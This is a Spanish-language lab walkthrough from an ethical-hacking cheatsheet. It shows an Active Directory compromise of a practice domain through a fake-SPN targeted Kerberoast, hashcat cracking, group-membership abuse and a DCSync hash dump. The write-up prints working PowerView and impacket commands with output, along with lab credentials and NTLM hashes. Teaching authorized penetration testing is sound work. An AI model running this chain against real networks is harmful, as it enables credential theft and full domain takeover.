
# Comprometiendo Active Directory

{% hint style="danger" %}
Editar esta página con los datos reales
{% endhint %}

Para resumir, investigamos el entorno de Active Directory y obtuvimos el siguiente par de credenciales:

`mssqladm:DBAilfreight1!`

## <mark style="color:purple;">Análisis con BloodHound</mark> <a href="#analisis-con-bloodhound" id="analisis-con-bloodhound"></a>

Al analizar los datos de BloodHound, observamos que tenemos permisos `GenericWrite` sobre usuario `ttimmons`. Con esto, podemos configurar un SPN falso en la cuenta `ttimmons` y realizar un ataque Kerberosting dirigido. Si este usuario usa una contraseña débil, podemos descifrarla y continuar.

<figure><img src="https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/~gitbook/image?url=https%3A%2F%2F2648005400-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FRolFIJKRJaxKzAUqQKJb%252Fuploads%252FxEFFbmPS8jW4VbscXkUl%252Fbloodhound-04.png%3Falt%3Dmedia%26token%3Db36b0e45-3644-4ce3-864a-b8bce47645c5&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=4a1fefd6&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Regresemos a la máquina `DEV01` donde cargamos PowerView.

### Explotación de GenericAll <a href="#explotacion-de-genericall" id="explotacion-de-genericall"></a>

#### Objeto PSCredential <a href="#objeto-pscredential" id="objeto-pscredential"></a>

Podemos crear un objeto `PSCredential` para poder ejecutar comandos como el usuario `mssqladm` sin tener que volver a usar RDP.

```powershell
PS C:\DotNetNuke\Portals\0> $SecPassword = ConvertTo-SecureString 'DBAilfreight1!' -AsPlainText -Force
PS C:\DotNetNuke\Portals\0> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\mssqladm', $SecPassword)
```

#### Crear un SPN falso <a href="#crear-un-spn-falso" id="crear-un-spn-falso"></a>

A continuación, usaremos `Set-DomainObject` para configurar un SPN falso en la cuenta objetivo. Crearemos un SPN llamado `acmetesting/LEGIT` que, por supuesto, eliminaremos más adelante y anotaremos en los apéndices de nuestro informe.

```powershell
PS C:\DotNetNuke\Portals\0> Set-DomainObject -credential $Cred -Identity ttimmons -SET @{serviceprincipalname='acmetesting/LEGIT'} -Verbose

VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
(&(|(|(samAccountName=ttimmons)(name=ttimmons)(displayname=ttimmons))))
VERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'acmetesting/LEGIT' for object 'ttimmons
```

#### Kerberoasting dirigido <a href="#kerberoasting-dirigido" id="kerberoasting-dirigido"></a>

A continuación podemos regresar a nuestro host de ataque y usar `GetUserSPNs.py` para realizar un ataque Keberoasting dirigido.

```
afsh4ck@kali$ proxychains impacket-GetUserSPNs -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/mssqladm -request-user ttimmons

ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation

Password: DBAilfreight1!

|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:389-<><>-OK
ServicePrincipalName  Name      MemberOf  PasswordLastSet             LastLogon  Delegation 
--------------------  --------  --------  --------------------------  ---------  ----------
acmetesting/LEGIT     ttimmons            2022-06-01 14:32:18.194423  <never>               

|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:88-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:88-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:88-<><>-OK
$krb5tgs$23$*ttimmons$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/ttimmons*$a6da9c2d88f061b698ca576528b3c298$32397bd4257c808f7401cb54a8ad9cd812f557ae891695f7f96138905e3035557f6e10a8fdda4f918ccac243a89907c5d7f73032315e1e6d356aa648fa68b3ec43fa684bda1412fa10bdc900a34f63a6d688a02d143de9c97fe9aa523e435d773c258916eea1f2e4325dc5e291008ec6135475c65b5511eac6e9a591c459f67d753fe2e33a206dfab81fbfc34f9326480f559d917098f23aeacb7a40a160aa2f6fd7a6fb53f86abf1693d77a7fe692b4f6f343a12eceba67752c3244327dacdcf44644efe789a76f7930e29b8a8805d1b3c6468739ee87c1e1de12939336de8786194ee1616a8c44a5711640890d600d16e6dd767aa9729137073b9b7ff404a2ae29b18d35b1ed04394acdae3fdd19255726887d9989687e6df1e10756d5bba4e84fce1d9edab19cda18bc63b0212570d1389e2bcadeab6f2c3df31e4433053897c7e12e8d26523c92d9ef96014f425b87d2931faeb3544436d347ce059707f9492f1adc263c9d3bef1880d2c2db7c73bc6557932f8b73be1e5c7a252c6f02dd04b6a38b9119c99d05550c16d57a70f5752dcc7d68bfa587781ff6b6092862c8843f9019f1f4ac46685f4f58567da22de34f6ffabdc0c49db19d8549270637e961005dfc6494aa8e8cfd4e8646dc4cc4758c59b0e2bb5778e716c560d008869da0b515c106f7faab024df0e4b1b3cc023695e3b95931d306fba35ec9ee6b0e40b1ca9bb699a6dda8dbd08910d23dfabf72c33aba476c119281631120dc37d1c9d57b7c3cfb2bbe1e00023e69c27c791d428273a0c96b688d1bdd7b28e27d9012f8de16ec60142638bf5f8fdbaeed38ce24af6c0a86a7a2b319ac2c20564dcc8dcfb10e55a4a8bf1df8e9a27503eeef8523406d0e79cdd52d91221a6e1a5ad877f6bdff1aebb985c607a413dfd23296f76bb50e97baeb287c7a6556b291ef6aec46395d477d0717a811b7756ab9955e1ea61345f36d5bbdf4f166db6d7c6fe34904b99b37a720e3f2eb99931dc6f4406b55819b6c132e09e19e467fec4d50222b329870568c6297bdc3531fdc7553ef416b4562bb1591e557a42043386e5b27f67c447f8c451ce6d7a68eb1e6828f67288e82cfa1ac5e313900dd0eff4b2ba79eb1b191d9ae11a7fda2857cb9646abb10ed7ff6a37c85a1cc4ceb8c425069b7f5cde60431d7f3a6aa2058bbb1f7b1516db8d06f0baf43ffb36c81db80fd23704c3af2578bceef8870e17910739286119f390e37ba7011b6d51a65ea05adf408b2999ae5a9ec22a720c1521e05e87ee43c5d3cbad92f470ae0b937100da19eeaf3cf1cf29a0ba4bf42461906425c1d74ff67f9ecc61c24b43edc2b3b52d0a8b9b9b0867b6c
```

#### Cracking de TGS <a href="#cracking-de-tgs" id="cracking-de-tgs"></a>

Iniciaremos Hashcat y veremos si el usuario está usando una contraseña débil.

```
afsh4ck@kali$ hashcat -m 13100 ttimmons_tgs /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

$krb5tgs$23$*ttimmons$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/ttimmons*$a6da9c2d88f061b698ca576528b3c298$32397bd4257c808f7401cb54a8ad9cd812f557ae891695f7f96138905e3035557f6e10a8fdda4f918ccac243a89907c5d7f73032315e1e6d356aa648fa68b3ec43fa684bda1412fa10bdc900a34f63a6d688a02d143de9c97fe9aa523e435d773c258916eea1f2e4325dc5e291008ec6135475c65b5511eac6e9a591c459f67d753fe2e33a206dfab81fbfc34f9326480f559d917098f23aeacb7a40a160aa2f6fd7a6fb53f86abf1693d77a7fe692b4f6f343a12eceba67752c3244327dacdcf44644efe789a76f7930e29b8a8805d1b3c6468739ee87c1e1de12939336de8786194ee1616a8c44a5711640890d600d16e6dd767aa9729137073b9b7ff404a2ae29b18d35b1ed04394acdae3fdd19255726887d9989687e6df1e10756d5bba4e84fce1d9edab19cda18bc63b0212570d1389e2bcadeab6f2c3df31e4433053897c7e12e8d26523c92d9ef96014f425b87d2931faeb3544436d347ce059707f9492f1adc263c9d3bef1880d2c2db7c73bc6557932f8b73be1e5c7a252c6f02dd04b6a38b9119c99d05550c16d57a70f5752dcc7d68bfa587781ff6b6092862c8843f9019f1f4ac46685f<SNIP>:Repeat09
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*ttimmons$INLANEFREIGHT.LOCAL$INLANEFRE...867b6c
Time.Started.....: Thu Oct 23 03:28:12 2025 (8 secs)
Time.Estimated...: Thu Oct 23 03:28:20 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1281.0 kH/s (2.77ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10682368/14344385 (74.47%)
Rejected.........: 0/10682368 (0.00%)
Restore.Point....: 10674176/14344385 (74.41%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: RipBMB420 -> RainBow10
Hardware.Mon.#1..: Util: 41%

Started: Thu Oct 23 03:27:44 2025
Stopped: Thu Oct 23 03:28:22 2025
```

Ahora tenemos otro par de credenciales que añadiremos a nuestro informe en la tabla de "`Compromised Users`"; es la hora del usuario `ttimmons`. Veamos qué tipo de acceso tiene este usuario.

Al revisar BloodHound de nuevo, vemos que tenemos acceso `GenericAll` al grupo `SERVER ADMINS`.

<figure><img src="https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/~gitbook/image?url=https%3A%2F%2F2648005400-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FRolFIJKRJaxKzAUqQKJb%252Fuploads%252FUlrCtyFc6ImB4yskkyZq%252Fbloodhound-05.png%3Falt%3Dmedia%26token%3D01f49767-182e-47d6-9273-a8f8f38213bb&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=610050bb&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Mirando un poco más allá, vemos que el grupo `SERVER ADMINS` tiene la capacidad de realizar el ataque `DCSync` para obtener hashes de contraseñas NTLM para cualquier usuario del dominio.

<figure><img src="https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/~gitbook/image?url=https%3A%2F%2F2648005400-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FRolFIJKRJaxKzAUqQKJb%252Fuploads%252F4Y0I0TbI1bTVrSRz5r5p%252Fbloodhound-06.png%3Falt%3Dmedia%26token%3D2180cbbf-0f50-45bb-8744-f3f916d1bdec&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=50fd142a&#x26;sv=2" alt=""><figcaption></figcaption></figure>

### Ataque DCSync <a href="#ataque-dcsync" id="ataque-dcsync"></a>

Para abusar de esto, primero agregamos al usuario `ttimmons` al grupo `SERVER ADMINS`. Primero, debemos crear otro objeto PSCredential.

```
PS C:\htb> PS C:\DotNetNuke\Portals\0> $timpass = ConvertTo-SecureString 'Repeat09' -AsPlainText -Force
PS C:\DotNetNuke\Portals\0> $timcreds = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\ttimmons', $timpass)
```

Una vez hecho esto, podemos agregar el usuario al grupo de destino y heredar los privilegios DCSync.

```
PS C:\DotNetNuke\Portals\0> $group = Convert-NameToSid "Server Admins"
PS C:\DotNetNuke\Portals\0> Add-DomainGroupMember -Identity $group -Members 'ttimmons' -Credential $timcreds -verbose

VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Add-DomainGroupMember] Adding member 'ttimmons' to group 'S-1-5-21-2814148634-3729814499-1637837074-1622
```

Finalmente, podemos usar Impacket Secretsdump para sincronizar con DCSync todos los hashes de contraseñas NTLM del controlador de dominio. Opcionalmente podemos usar `> hashes.ntds` al final para guardar toda la salida en un archivo para crackear fácilmente todos los hashes o pasárselo a otras herramientas como DPAT, que veremos en la siguiente sección.

```
afsh4ck@kali$ proxychains impacket-secretsdump ttimmons@172.16.8.3 -just-dc-ntlm

ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation

Password: Repeat09

|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:135-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:49676-<><>-OK
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fd1f7e5564060258ea787ddbb6e6afa2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b9362dfa5abf924b0d172b8c49ab58ac:::
inlanefreight.local\avazquez:1716:aad3b435b51404eeaad3b435b51404ee:762cbc5ea2edfca03767427b2f2a909f:::
inlanefreight.local\pfalcon:1717:aad3b435b51404eeaad3b435b51404ee:f8e656de86b8b13244e7c879d8177539:::
inlanefreight.local\fanthony:1718:aad3b435b51404eeaad3b435b51404ee:9827f62cf27fe221b4e89f7519a2092a:::
inlanefreight.local\wdillard:1719:aad3b435b51404eeaad3b435b51404ee:69ada25bbb693f9a85cd5f176948b0d5:::
inlanefreight.local\lbradford:1720:aad3b435b51404eeaad3b435b51404ee:0717dbc7b0e91125777d3ff4f3c00533:::

<SNIP>
```

***

## <mark style="color:purple;">Próximos pasos</mark> <a href="#proximos-pasos" id="proximos-pasos"></a>

Después de documentar todos los pasos, podemos realizar diversas acciones, muchas de las cuales se detallan en la siguiente sección. Es recomendable volcar toda la base de datos NTDS y descifrar contraseñas sin conexión para que el cliente tenga una idea de la seguridad general de sus contraseñas y otras métricas.

También puede mostrar evidencia de la capacidad de autenticarse en un controlador de dominio y ejecutar algunos comandos, ya que esto puede ser más claro que ver el resultado de secretsdump, con el que quizás no estén familiarizados. Conectarse al controlador de dominio mediante RDP e incluir una captura de pantalla en el informe que muestre una consola abierta con los resultados de los comandos `hostname`, `whoami` y `ipconfig /all`puede ser una excelente herramienta visual.

Además, podemos aportar mucho valor después de la administración del dominio realizando auditorías adicionales de AD, atacando las confianzas de dominio y bosque (si están dentro del alcance) y, finalmente, probando las alertas del cliente creando un nuevo administrador de dominio y un administrador de empresa o añadiendo una cuenta que controlemos a cada uno de estos grupos. Lo ideal es que supervisen estos grupos con altos privilegios y detecten esto, ya sea manualmente o, mejor aún, implementen un sistema automatizado para eliminar las cuentas de los grupos.

Si lo hacen, incluyan esta acción en el informe como un cambio de configuración en los apéndices y feliciten al cliente si lo detecta y toma las medidas correspondientes. Reconocer las acciones positivas que observan en la red o que realiza el cliente es importante y contribuye en gran medida a generar buena reputación.
